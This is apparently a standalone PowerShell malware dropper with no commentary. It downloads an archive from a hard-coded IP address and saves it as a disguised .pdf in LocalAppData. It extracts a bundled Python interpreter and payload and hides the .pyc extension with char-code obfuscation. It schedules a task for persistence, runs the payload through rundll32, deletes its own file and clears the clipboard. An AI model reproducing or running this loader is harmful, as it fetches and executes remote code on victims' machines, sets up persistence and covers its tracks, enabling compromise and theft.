PYC = ([char]46)+([char]112)+([char]121)+([char]99) # .pyc
$GUID = [guid]::NewGuid()
$APPDATA = $env:LocalAppData
irm 'http://10.1.166.227/?tic=2' -OutFile $APPDATA\$GUID.pdf
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("$APPDATA\$GUID.pdf", "$APPDATA\$GUID")
$FILEPATH = Join-Path $APPDATA $GUID
$GUID2 = "$GUID"
$PYTHONW = "$FILEPATH\pythonw.exe"
$CPYTHON = "$FILEPATH\cpython-3134.pyc"
$SCHEDULEDTASK = New-ScheduledTaskAction -Execute $PYTHONW -Argument "`"$CPYTHON`""
$TIMER = (Get-Date).AddSeconds(180)
$TASKTRIGGER = New-ScheduledTaskTrigger -Once -At $TIMER
$TASKPRINCIPAL = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName $GUID2 -Action $SCHEDULEDTASK -Trigger $TASKTRIGGER -Principal $TASKPRINCIPAL -Force
Set-Location $FILEPATH
$WMVCNDYGDHJ = "cpython-3134" + PYC
 Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ
 iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $FILEPATH + '\pythonw" "' + $FILEPATH + '\'+ $WMVCNDYGDHJ + '"')
Remove-Item $MyInvocation.MyCommand.Path -Force
Set-Clipboard